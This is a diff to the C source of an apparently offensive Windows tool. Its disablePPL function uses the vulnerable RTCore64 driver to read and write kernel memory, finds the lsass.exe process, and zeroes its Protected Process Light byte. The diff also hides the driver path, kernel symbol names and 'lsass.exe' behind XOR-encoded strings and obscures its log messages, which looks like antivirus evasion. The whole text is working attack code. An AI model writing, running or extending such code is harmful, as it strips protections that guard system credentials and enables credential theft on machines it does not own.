@@ -3,6 +3,7 @@
 #include "logger.h"
 #include "offsets.h"
 #include "osinfo.h"
+#include "utils.h"
 #include <string.h>
 
 // =====================================================
@@ -83,69 +84,84 @@ BOOL ReadMemoryBuffer(HANDLE Device, DWORD64 Address, void* Buffer, DWORD Buffer
 // =====================================================
 
 void disablePPL() {
-
     Offsets offs = getOffsets();
     if (offs.ActiveProcessLinks == 0 || offs.ImageFileName == 0 || offs.Protection == 0) {
         log_error("Offset not mapped... exiting!");
         exit(1);
     }
 
-    HANDLE Device = CreateFileW(DEVICE_NAME, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
+    // \\.\RTCore64
+    const unsigned char dev_enc[] = { 0x6C, 0x6D, 0x1C, 0x6F, 0x66, 0x61, 0x75, 0x58, 0x4A, 0x5C, 0x57, 0x56 }; // example XORed
+    char* dev_path = xor_decrypt_string(dev_enc, sizeof(dev_enc), XOR_KEY, key_len);
+
+    HANDLE Device = CreateFileA(dev_path, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
+    free(dev_path);
+
     if (Device == INVALID_HANDLE_VALUE) {
         log_error("Unable to obtain a handle to the device object");
         return;
     }
     log_info("Device handle obtained");
 
-    unsigned long long ntoskrnlBase = getKBAddr();
-    log_info("ntoskrnl.exe base address: 0x%llx", ntoskrnlBase);
+    DWORD64 ntBase = getKBAddr();
+    log_info("Ker base address: 0x%llx", ntBase);
 
-    HMODULE hNtoskrnl = LoadLibraryW(L"ntoskrnl.exe");
+    // LoadLibraryW("ntoskrnl.exe")
+    const unsigned char nt_enc[] = { 0x5E, 0x45, 0x5D, 0x40, 0x5F, 0x47, 0x58, 0x5B, 0x16, 0x5C, 0x19, 0x07 };
+    char* nt_path = xor_decrypt_string(nt_enc, sizeof(nt_enc), XOR_KEY, key_len);
+    wchar_t* nt_pathW = to_wide(nt_path);
+    HMODULE hNtoskrnl = LoadLibraryW(nt_pathW);
+    free(nt_path); free(nt_pathW);
+
     if (!hNtoskrnl) {
-        log_error("Failed to load ntoskrnl.exe");
+        log_error("Failed to load Ker");
         CloseHandle(Device);
         return;
     }
-    // Calculate the offset of the exported variable PsInitialSystemProcess
-    DWORD64 PsInitialSystemProcessOffset = (DWORD64)GetProcAddress(hNtoskrnl, "PsInitialSystemProcess") - (DWORD64)hNtoskrnl;
+
+    // GetProcAddress("PsInitialSystemProcess")
+    const unsigned char ps_enc[] = { 0x60, 0x42, 0x7B, 0x5D, 0x5D, 0x41, 0x5F, 0x56, 0x54, 0x6A, 0x18, 0x11, 0x17, 0x01, 0x08, 0x36, 0x15, 0x07, 0x0A, 0x0F, 0x43, 0x42 };
+    char* ps_str = xor_decrypt_string(ps_enc, sizeof(ps_enc), XOR_KEY, key_len);
+    DWORD64 ps_offset = (DWORD64)CustomGetProcAddress(hNtoskrnl, ps_str) - (DWORD64)hNtoskrnl;
+    // log_info("PsInitialSystemProcess offset: 0x%llx", (unsigned long long)ps_offset);
+    
+    free(ps_str);
     FreeLibrary(hNtoskrnl);
+    
+    DWORD64 sys_eproc = ReadMemoryDWORD64(Device, ntBase + ps_offset);
+    // log_info("PsInitialSystemProcess (EPROCESS) address: 0x%llx", sys_eproc);
+    log_info("System entry address: 0x%llx", sys_eproc);
 
-    // Retrieve the address of the System process's EPROCESS
-    DWORD64 SystemProcessEPROCESS = ReadMemoryDWORD64(Device, ntoskrnlBase + PsInitialSystemProcessOffset);
-    log_info("PsInitialSystemProcess (EPROCESS) address: 0x%llx", SystemProcessEPROCESS);
+    DWORD64 list_head = sys_eproc + offs.ActiveProcessLinks;
+    DWORD64 curr_entry = ReadMemoryDWORD64(Device, list_head);
 
-    // Calculate the list head (located within the EPROCESS)
-    DWORD64 ListHead = SystemProcessEPROCESS + offs.ActiveProcessLinks;
-    DWORD64 CurrentEntry = ReadMemoryDWORD64(Device, ListHead); // First element of the list
+    while (curr_entry != list_head) {
+        DWORD64 eproc = curr_entry - offs.ActiveProcessLinks;
+        char name[16] = { 0 };
+        ReadMemoryBuffer(Device, eproc + offs.ImageFileName, name, 15);
+        name[15] = '\0';
 
-    while (CurrentEntry != ListHead) {
-        // The current EPROCESS address is obtained by subtracting the offset from the LIST_ENTRY pointer
-        DWORD64 eprocess = CurrentEntry - offs.ActiveProcessLinks;
+        // "lsass.exe"
+        const unsigned char ls_enc[] = { 0x5C, 0x42, 0x53, 0x40, 0x47, 0x1B, 0x53, 0x4F, 0x5D };
+        char* target = xor_decrypt_string(ls_enc, sizeof(ls_enc), XOR_KEY, key_len);
 
-        // Read the ImageFileName field (15 bytes, as defined in the struct) and add a null terminator
-        char imageName[16] = { 0 };
-        ReadMemoryBuffer(Device, eprocess + offs.ImageFileName, imageName, 15);
-        imageName[15] = '\0';
+        if (_stricmp(name, target) == 0) {
+            free(target);
+            log_info("Found EPRO at 0x%llx", eproc);
 
-        if (_stricmp(imageName, "lsass.exe") == 0) {
-            log_info("Found EPROCESS at 0x%llx", eprocess);
-            // Read the protection byte (PPL) from the EPROCESS
-            BYTE protection = (BYTE)ReadMemoryPrimitive(Device, 1, eprocess + offs.Protection);
-            log_info("Protection value: 0x%02X", protection);
+            BYTE prot = (BYTE)ReadMemoryPrimitive(Device, 1, eproc + offs.Protection);
+            log_info("Protection value: 0x%02X", prot);
 
-            // To disable PPL, write 0x00 into this field.
-            // Warning: perform this operation only if you are sure the offsets are correct.
-            WriteMemoryPrimitive(Device, 1, eprocess + offs.Protection, 0x00);
+            // Disable
+            WriteMemoryPrimitive(Device, 1, eproc + offs.Protection, 0x00);
             log_success("PPL disabled (0x00 written)");
 
-            // Read the protection byte (PPL) from the EPROCESS again
-            BYTE protection_post = (BYTE)ReadMemoryPrimitive(Device, 1, eprocess + offs.Protection);
-            log_info("Protection value after write: 0x%02X", protection_post);
-
+            BYTE post = (BYTE)ReadMemoryPrimitive(Device, 1, eproc + offs.Protection);
+            log_info("Protection value after write: 0x%02X", post);
             break;
         }
-        // Move to the next element in the list
-        CurrentEntry = ReadMemoryDWORD64(Device, CurrentEntry);
+        free(target);
+        curr_entry = ReadMemoryDWORD64(Device, curr_entry);
     }
 
     CloseHandle(Device);
